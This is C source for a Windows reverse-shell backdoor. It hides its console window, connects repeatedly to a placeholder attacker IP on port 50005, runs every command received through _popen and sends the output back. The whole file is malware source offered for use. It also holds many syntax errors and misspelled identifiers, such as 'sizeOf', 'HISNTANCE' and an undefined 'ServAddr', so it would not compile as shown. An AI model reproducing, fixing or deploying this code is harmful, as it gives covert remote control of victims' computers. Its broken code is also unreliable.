#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>


int sock;


#define putZero(p, size) (void) memset((p), 0, (size))


void Shell(){
    // returns nothing

    char buffer[1024];  // stores command
    char container[1024];
    char total_response[18384];

    // Converstaion between server and client
    while(1){
        jump:
            // zero out variables
            putZero(buffer, sizeOf(buffer));
            putZero(container, sizeOf(container));
            putZero(total_response, sizeOf(total_response));

        // receive command from server
        recv(sock, buffer, 1024, 0) 

        // do action based off what command was recv'd in buffer
        if ((strncmp("q", buffer. 1)) == 0){
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else{
            FILE *fp;
            fp = _popen(buffer, "r") // read buffer and execute (as a process) it; store it in fp

            // copying (first, second, third, etc.) 1024 bytes from fp to container, then adding container into total_response. This is repeated until entire response is inside total_response
            while (fgets(container, 1024, fp) != NULL) {
                strcat(total_response, container)
            }

            // send the response to server
            send(sock, total_response, sizeOf(total_response), 0);
            fclose(fp);

        }
    }

}

int APIENTRY WinMain(HINSTANCE hInstance, HISNTANCE hPev, LPSTR lpCmdLine, int nCmdShow) {

    // Hide the console window
    HWND stealth;
    AllocConsole(); // allocate new console to calling function
    stealth = FindWindowA("ConsoleWindowClass", NULL)  // gets handle to top level window
    ShowWindow(stealth, 0); // hides the window


    // Prepping socket items
    struct sockaddr_in ServerAddr;
    unsigned short ServerPort;
    char *ServerIP;
    WSADATA wsaData // structure that contains info about Windows Socket (Windows to Windows)
    ServerIP = "<SERVER_IP>"; // REPLACE!!!
    ServerPort = 50005;

    // Kill program if conneciton is not possible
    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
        exit(1); 
    }

    // Cont'd prepping socket items
    sock = socket(AF_INET, SOCK_STREAM, 0); // AF_INET: establishing connection over IPv4, SOCK_STREAM: TCP/3-way handshake
    memset(&ServerAddr, 0, sizeOf(ServerAddr)) // zero out the content serverAddr (because it's structs)
    ServerAddr.sin_family = AF_INET;
    ServerAddr.sin_addr.s_addr = inet_addr(ServerIP);
    ServerAddr.sin_port = htons(ServerPort);

    // rewrite start logic...
    start:
        // Perform connect function every 10 seconds until it is equal 0 (zero means connection was established)
        while ( connect(sock, (struct sockaddr *) &ServAddr, sizeOf(ServerAddr)) != 0 ) {
            Sleep(10);
            goto start;
        }
    
    // recv commands from server, execute them, and then send the information back
    Shell();
}